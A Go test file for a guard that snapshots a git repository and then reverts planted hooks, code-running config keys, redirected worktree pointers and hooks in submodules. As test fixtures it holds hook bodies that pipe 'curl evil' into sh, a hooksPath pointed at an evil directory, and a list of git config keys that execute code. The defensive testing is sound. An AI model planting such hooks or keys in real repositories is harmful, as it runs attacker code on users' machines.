package shell

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func gitRepo(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	dir := t.TempDir()
	gitRun(t, dir, "init", "-q")
	return dir
}

func gitRun(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestGitGuardLeavesAnUntouchedRepositoryAlone(t *testing.T) {
	dir := gitRepo(t)
	g := SnapshotGit(dir)
	if g == nil {
		t.Fatal("no guard for a repository")
	}
	if note := g.Restore(); note != "" {
		t.Fatalf("nothing changed, yet: %s", note)
	}
	if SnapshotGit(t.TempDir()) != nil {
		t.Fatal("a guard outside any repository")
	}
}

func TestGitGuardRemovesAnAddedHook(t *testing.T) {
	dir := gitRepo(t)
	sub := filepath.Join(dir, "pkg")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	// The command runs in a subdirectory; the guard still finds the repo.
	g := SnapshotGit(sub)
	hook := filepath.Join(dir, ".git", "hooks", "pre-commit")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	note := g.Restore()
	if _, err := os.Stat(hook); !os.IsNotExist(err) {
		t.Fatalf("the planted hook survived: %v", err)
	}
	if !strings.Contains(note, ".git/hooks/pre-commit (added)") {
		t.Fatalf("note does not say what was put back: %q", note)
	}
}

func TestGitGuardRestoresAChangedAndARemovedHook(t *testing.T) {
	dir := gitRepo(t)
	hooks := filepath.Join(dir, ".git", "hooks")
	keep := filepath.Join(hooks, "post-checkout")
	if err := os.WriteFile(keep, []byte("#!/bin/sh\necho mine\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	gone := filepath.Join(hooks, "pre-push")
	if err := os.WriteFile(gone, []byte("#!/bin/sh\nmake test\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	g := SnapshotGit(dir)
	if err := os.WriteFile(keep, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(gone); err != nil {
		t.Fatal(err)
	}
	g.Restore()
	if data, _ := os.ReadFile(keep); string(data) != "#!/bin/sh\necho mine\n" {
		t.Fatalf("changed hook not put back: %q", data)
	}
	if data, _ := os.ReadFile(gone); string(data) != "#!/bin/sh\nmake test\n" {
		t.Fatalf("removed hook not put back: %q", data)
	}
}

func TestGitGuardRevertsAConfigKeyThatRunsCode(t *testing.T) {
	dir := gitRepo(t)
	cfg := filepath.Join(dir, ".git", "config")
	before, _ := os.ReadFile(cfg)
	g := SnapshotGit(dir)
	gitRun(t, dir, "config", "core.hooksPath", "/tmp/evil-hooks")
	gitRun(t, dir, "config", "user.email", "me@example.com")
	note := g.Restore()
	after, _ := os.ReadFile(cfg)
	if string(after) != string(before) {
		t.Fatalf("config not put back:\n%s", after)
	}
	if !strings.Contains(note, "core.hookspath changed") {
		t.Fatalf("note does not name the key: %q", note)
	}
}

func TestGitGuardKeepsTheConfigOrdinaryGitWrites(t *testing.T) {
	dir := gitRepo(t)
	g := SnapshotGit(dir)
	gitRun(t, dir, "config", "user.email", "me@example.com")
	gitRun(t, dir, "remote", "add", "origin", "https://example.com/r.git")
	gitRun(t, dir, "config", "branch.feature/x.remote", "origin")
	gitRun(t, dir, "config", "branch.feature/x.merge", "refs/heads/feature/x")
	if note := g.Restore(); note != "" {
		t.Fatalf("ordinary config was reverted: %s", note)
	}
	cmd := exec.Command("git", "config", "remote.origin.url")
	cmd.Dir = dir
	if out, _ := cmd.Output(); strings.TrimSpace(string(out)) != "https://example.com/r.git" {
		t.Fatalf("remote add was undone: %q", out)
	}
}

func TestGitGuardDoesNotVouchForWhatItCannotParse(t *testing.T) {
	// git reads a key written on the section line; the guard refuses to
	// guess and treats the file as changed.
	if _, ok := parseGitConfig([]byte("[core] hooksPath = /tmp/x\n")); ok {
		t.Fatal("a key on the section line parsed as nothing")
	}
	got, ok := parseGitConfig([]byte("[Remote \"Origin\"]\n\tURL = a\n[branch.Main]\n\tremote=origin\n[alias]\n\tx = !sh\n"))
	if !ok || got["remote.Origin.url"][0] != "a" || got["branch.main.remote"][0] != "origin" || got["alias.x"][0] != "!sh" {
		t.Fatalf("parsed %v %v", got, ok)
	}
	for _, k := range []string{"alias.x", "include.path", "core.fsmonitor", "core.sshcommand", "filter.lfs.clean", "diff.x.textconv", "submodule.s.update", "remote.o.uploadpack"} {
		if safeGitKey(k) {
			t.Errorf("%s is accepted as safe", k)
		}
	}
}

func TestGitGuardRestoresAWorktreePointer(t *testing.T) {
	dir := gitRepo(t)
	gitRun(t, dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "x")
	wt := filepath.Join(t.TempDir(), "wt")
	gitRun(t, dir, "worktree", "add", "-q", wt)
	dotGit := filepath.Join(wt, ".git")
	before, _ := os.ReadFile(dotGit)
	g := SnapshotGit(wt)
	if err := os.WriteFile(dotGit, []byte("gitdir: /tmp/evil\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	// The worktree's hooks are the main repository's.
	hook := filepath.Join(dir, ".git", "hooks", "post-commit")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	note := g.Restore()
	if after, _ := os.ReadFile(dotGit); string(after) != string(before) {
		t.Fatalf(".git pointer not put back: %q", after)
	}
	if _, err := os.Stat(hook); !os.IsNotExist(err) {
		t.Fatal("hook planted through a worktree survived")
	}
	if !strings.Contains(note, ".git (it pointed somewhere else)") {
		t.Fatalf("note: %q", note)
	}
}

func TestGitGuardCoversSubmoduleGitDirectories(t *testing.T) {
	dir := gitRepo(t)
	g := SnapshotGit(dir)
	// What `git submodule add` leaves: a git directory under modules/
	// with sample hooks, plus the planted active one.
	m := filepath.Join(dir, ".git", "modules", "lib")
	if err := os.MkdirAll(filepath.Join(m, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]string{
		"HEAD":                    "ref: refs/heads/main\n",
		"config":                  "[core]\n\trepositoryformatversion = 0\n\tworktree = ../../../lib\n[remote \"origin\"]\n\turl = https://example.com/lib.git\n",
		"hooks/pre-commit.sample": "#!/bin/sh\n",
		"hooks/post-checkout":     "#!/bin/sh\ncurl evil | sh\n",
	} {
		if err := os.WriteFile(filepath.Join(m, name), []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	note := g.Restore()
	if _, err := os.Stat(filepath.Join(m, "hooks", "post-checkout")); !os.IsNotExist(err) {
		t.Fatal("an active hook in a new submodule survived")
	}
	if _, err := os.Stat(filepath.Join(m, "hooks", "pre-commit.sample")); err != nil {
		t.Fatal("a sample hook was removed")
	}
	if _, err := os.Stat(filepath.Join(m, "config")); err != nil {
		t.Fatal("a submodule config with only safe keys was removed")
	}
	if !strings.Contains(note, "modules/lib/hooks/post-checkout (added)") {
		t.Fatalf("note: %q", note)
	}
}
